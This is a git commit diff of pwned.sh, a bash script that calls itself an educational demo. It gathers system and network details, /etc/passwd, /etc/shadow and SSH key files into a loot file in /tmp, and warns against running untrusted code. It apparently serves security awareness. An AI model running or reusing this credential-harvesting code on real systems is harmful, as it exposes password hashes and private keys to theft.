0b52b35901a99ea92949c361f633e758e778c659
Angel Garcia J. <76765310+vAnglez@users.noreply.github.com>
2025-01-03 22:45:36 -0800

    Fix error from bad characters/command
    This time made sure to have -e on all the echo commands so the color actually show and don't make the command output look jank

--- pwned.sh
+++ pwned.sh
@@ -1,77 +1,71 @@
+#!/bin/bash
 # DISCLAIMER: This script is for educational purposes only.
 # Any personal or sensitive information found in the loot file is stored in /tmp/loot.txt
 # Nothing was actually exfiltrated but just remember that actual attackers would
 # Stay safe and happy hacking!
 
-# Color Codes
-GREEN='\033[1;32m'
-RED='\033[0;31m'
-
-# No Color
-NC='\033[0m'
-
 # Spacing
 echo ""
 
 # Print Logo
-echo "${GREEN}                           ██████████████████████                           ${NC}"
-echo "${GREEN}                      ██████                    ██████                      ${NC}"
-echo "${GREEN}                   ████                              ████                   ${NC}"
-echo "${GREEN}                ████                                    ███                 ${NC}"
-echo "${GREEN}       █      ███  ██████████               ██████████  ██████████          ${NC}"
-echo "${GREEN}       ██   ███    ██      ██  ██       ██  ██          ██   █████          ${NC}"
-echo "${GREEN}       ██  ██      ██      ██  ██       ██  ██          ██     ███          ${NC}"
-echo "${GREEN}       █████       ██      ██  ██       ██  ██          ██      ███         ${NC}"
-echo "${GREEN}       ███         ██      ██  ██       ██  ██          ██      ████        ${NC}"
-echo "${GREEN}      ███          ██      ██  ██       ██  ██          ██      ██ ██       ${NC}"
-echo "${GREEN}      ███          ██      ██  ██       ██  ██          ██      ██  ██      ${NC}"
-echo "${GREEN}     ████          ██████████  ███████████  █████████   ██████████   ██     ${NC}"
-echo "${GREEN}    ██ ██          ██      ██           ██  ██          ██           ███    ${NC}"
-echo "${GREEN}   ███ ██          ██      ██           ██  ██          ██   █        ██    ${NC}"
-echo "${GREEN}   ██  ██          ██      ██           ██  ██          ██   ██        ██   ${NC}"
-echo "${GREEN}   ██  ██          ██      ██           ██  ██          ██    ██       ██   ${NC}"
-echo "${GREEN}  ██   ██          ██      ██           ██  ██          ██    ██       ███  ${NC}"
-echo "${GREEN}  ██   ██          ██      ██           ██  ██          ██     ██       ██  ${NC}"
-echo "${GREEN}  ██   █████████   ██       █    ███ █████  █████████   ██      █       ██  ${NC}"
-echo "${GREEN}  ██                                                                    ██  ${NC}"
-echo "${GREEN}  ██    ███████████    ███████████    ████████████   ████████████       ██  ${NC}"
-echo "${GREEN}  ██            ██    ███             ██        ██   ██        ██      ███  ${NC}"
-echo "${GREEN}   ██          ███    ███             ██        ██   ██        ██      ███  ${NC}"
-echo "${GREEN}   ██          ██     ███             ██        ██   ██        ██      ██   ${NC}"
-echo "${GREEN}   ███        ███     ███             ██        ██   ██        ██     ███   ${NC}"
-echo "${GREEN}    ██        ██      ███             ██        ██   ██        ██     ██    ${NC}"
-echo "${GREEN}    ███               ███             ██        ██   ██        ██    ██     ${NC}"
-echo "${GREEN}      ██              ████████████    ████████████   ██        ██   ██      ${NC}"
-echo "${GREEN}      ███             ███             ██             ██        ██  ███      ${NC}"
-echo "${GREEN}       ███  █         ███             ██    █        ██        ██ ███       ${NC}"
-echo "${GREEN}         ████         ███             ██    ███      ██        ████         ${NC}"
-echo "${GREEN}          ███         ███             ██     ██      ██        ███          ${NC}"
-echo "${GREEN}          █████       ███             ██     ███     ██      ████           ${NC}"
-echo "${GREEN}         ███  ███     ███             ██      ██     ██    ███ ██           ${NC}"
-echo "${GREEN}         ████ █████   ██████ █████    ██       █     ████████████           ${NC}"
-echo "${GREEN}                   ███                                ████                  ${NC}"
-echo "${GREEN}                      ████                       █████                      ${NC}"
-echo "${GREEN}                          ████████       █████████                          ${NC}"
-echo "${GREEN}                                  ████████                                  ${NC}"
+echo -e "\033[1;32m                           ██████████████████████                           \033[0m"
+echo -e "\033[1;32m                      ██████                    ██████                      \033[0m"
+echo -e "\033[1;32m                   ████                              ████                   \033[0m"
+echo -e "\033[1;32m                ████                                    ███                 \033[0m"
+echo -e "\033[1;32m       █      ███  ██████████               ██████████  ██████████          \033[0m"
+echo -e "\033[1;32m       ██   ███    ██      ██  ██       ██  ██          ██   █████          \033[0m"
+echo -e "\033[1;32m       ██  ██      ██      ██  ██       ██  ██          ██     ███          \033[0m"
+echo -e "\033[1;32m       █████       ██      ██  ██       ██  ██          ██      ███         \033[0m"
+echo -e "\033[1;32m       ███         ██      ██  ██       ██  ██          ██      ████        \033[0m"
+echo -e "\033[1;32m      ███          ██      ██  ██       ██  ██          ██      ██ ██       \033[0m"
+echo -e "\033[1;32m      ███          ██      ██  ██       ██  ██          ██      ██  ██      \033[0m"
+echo -e "\033[1;32m     ████          ██████████  ███████████  █████████   ██████████   ██     \033[0m"
+echo -e "\033[1;32m    ██ ██          ██      ██           ██  ██          ██           ███    \033[0m"
+echo -e "\033[1;32m   ███ ██          ██      ██           ██  ██          ██   █        ██    \033[0m"
+echo -e "\033[1;32m   ██  ██          ██      ██           ██  ██          ██   ██        ██   \033[0m"
+echo -e "\033[1;32m   ██  ██          ██      ██           ██  ██          ██    ██       ██   \033[0m"
+echo -e "\033[1;32m  ██   ██          ██      ██           ██  ██          ██    ██       ███  \033[0m"
+echo -e "\033[1;32m  ██   ██          ██      ██           ██  ██          ██     ██       ██  \033[0m"
+echo -e "\033[1;32m  ██   █████████   ██       █    ███ █████  █████████   ██      █       ██  \033[0m"
+echo -e "\033[1;32m  ██                                                                    ██  \033[0m"
+echo -e "\033[1;32m  ██    ███████████    ███████████    ████████████   ████████████       ██  \033[0m"
+echo -e "\033[1;32m  ██            ██    ███             ██        ██   ██        ██      ███  \033[0m"
+echo -e "\033[1;32m   ██          ███    ███             ██        ██   ██        ██      ███  \033[0m"
+echo -e "\033[1;32m   ██          ██     ███             ██        ██   ██        ██      ██   \033[0m"
+echo -e "\033[1;32m   ███        ███     ███             ██        ██   ██        ██     ███   \033[0m"
+echo -e "\033[1;32m    ██        ██      ███             ██        ██   ██        ██     ██    \033[0m"
+echo -e "\033[1;32m    ███               ███             ██        ██   ██        ██    ██     \033[0m"
+echo -e "\033[1;32m      ██              ████████████    ████████████   ██        ██   ██      \033[0m"
+echo -e "\033[1;32m      ███             ███             ██             ██        ██  ███      \033[0m"
+echo -e "\033[1;32m       ███  █         ███             ██    █        ██        ██ ███       \033[0m"
+echo -e "\033[1;32m         ████         ███             ██    ███      ██        ████         \033[0m"
+echo -e "\033[1;32m          ███         ███             ██     ██      ██        ███          \033[0m"
+echo -e "\033[1;32m          █████       ███             ██     ███     ██      ████           \033[0m"
+echo -e "\033[1;32m         ███  ███     ███             ██      ██     ██    ███ ██           \033[0m"
+echo -e "\033[1;32m         ████ █████   ██████ █████    ██       █     ████████████           \033[0m"
+echo -e "\033[1;32m                   ███                                ████                  \033[0m"
+echo -e "\033[1;32m                      ████                       █████                      \033[0m"
+echo -e "\033[1;32m                          ████████       █████████                          \033[0m"
+echo -e "\033[1;32m                                  ████████                                  \033[0m"
 
 # Spacing
 echo ""
 
 # Begin looting computer
-echo "${RED}Looting computer...${NC}"
+echo -e "\033[0;31mLooting computer...\033[0m"
 
 # Set file name
 filename="$(date | base64)-loot"
 touch /tmp/$filename
 
 # Grab System Info
-echo "${RED}This is the system info${NC}" 2>/dev/null >> /tmp/$filename
+echo -e "\033[0;31mThis is the system info\033[0m" 2>/dev/null >> /tmp/$filename
 uname -a 2>/dev/null >> /tmp/$filename
 cat /etc/os-release 2>/dev/null >> /tmp/$filename
 echo "" 2>/dev/null >> /tmp/$filename
 
 # Network Info
-echo "${RED}This is the network info${NC}" 2>/dev/null >> /tmp/$filename
+echo -e "\033[0;31mThis is the network info\033[0m" 2>/dev/null >> /tmp/$filename
 echo "Public IP Address: $(curl -s https://ifconfig.me)" 2>/dev/null >> /tmp/$filename
 echo "" 2>/dev/null >> /tmp/$filename
 ifconfig 2>/dev/null >> /tmp/$filename
@@ -80,44 +74,44 @@ ip addr 2>/dev/null >> /tmp/$filename
 echo "" 2>/dev/null >> /tmp/$filename
 
 # Running Processes
-echo "${RED}This is the running processes${NC}" 2>/dev/null >> /tmp/$filename 
+echo -e "\033[0;31mThis is the running processes\033[0m" 2>/dev/null >> /tmp/$filename 
 ps auxf 2>/dev/null >> /tmp/$filename
 echo "" 2>/dev/null >> /tmp/$filename
 
 # Users Info
-echo "${RED}This is the users info${NC}" 2>/dev/null >> /tmp/$filename
+echo -e "\033[0;31mThis is the users info\033[0m" 2>/dev/null >> /tmp/$filename
 who 2>/dev/null >> /tmp/$filename
 w 2>/dev/null >> /tmp/$filename
 
 # Groups Info
-echo "${RED}This is the groups info${NC}" 2>/dev/null >> /tmp/$filename
+echo -e "\033[0;31mThis is the groups info\033[0m" 2>/dev/null >> /tmp/$filename
 groups 2>/dev/null >> /tmp/$filename
 
 # New line
 echo "" 2>/dev/null >> /tmp/$filename
 
 # /etc/passwd
-echo "${RED}This is the /etc/passwd file${NC}" 2>/dev/null >> /tmp/$filename
+echo -e "\033[0;31mThis is the /etc/passwd file\033[0m" 2>/dev/null >> /tmp/$filename
 cat /etc/passwd 2>/dev/null >> /tmp/$filename
 echo "" 2>/dev/null >> /tmp/$filename
 
 # /etc/shadow
-echo "${RED}This is the /etc/shadow file${NC}" 2>/dev/null >> /tmp/$filename
+echo -e "\033[0;31mThis is the /etc/shadow file\033[0m" 2>/dev/null >> /tmp/$filename
 cat /etc/shadow 2>/dev/null >> /tmp/$filename
 echo "" 2>/dev/null >> /tmp/$filename
 
 # SSH Keys
-echo "${RED}This is the SSH keys${NC}" 2>/dev/null >> /tmp/$filename
+echo -e "\033[0;31mThis is the SSH keys\033[0m" 2>/dev/null >> /tmp/$filename
 cat ~/.ssh/authorized_keys 2>/dev/null >> /tmp/$filename
 cat ~/.ssh/* 2>/dev/null >> /tmp/$filename
 
 # End of looting
 money='$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'
 echo ""
-echo "${RED}${money}${NC}"
-echo "Check ${RED}/tmp/$filename${NC} for the loot"
-echo "${RED}${money}${NC}"
+echo -e "\033[0;31m${money}\033[0m"
+echo -e "Check \033[0;31m/tmp/$filename\033[0m for the loot"
+echo -e "\033[0;31m${money}\033[0m"
 echo ""
-echo "${GREEN}NEVER RUN CODE FROM UNTRUSTED SOURCES BUT IF YOU DO, AUDIT IT FIRST${NC}"
+echo -e "\033[1;32mNEVER RUN CODE FROM UNTRUSTED SOURCES BUT IF YOU DO, AUDIT IT FIRST\033[0m"
 echo ""
-echo "Check the loot file to see if there are any valuables there :) - ${RED}@vAnglez${NC}"
+echo -e "Check the loot file to see if there are any valuables there :) - \033[0;31m@vAnglez\033[0m"
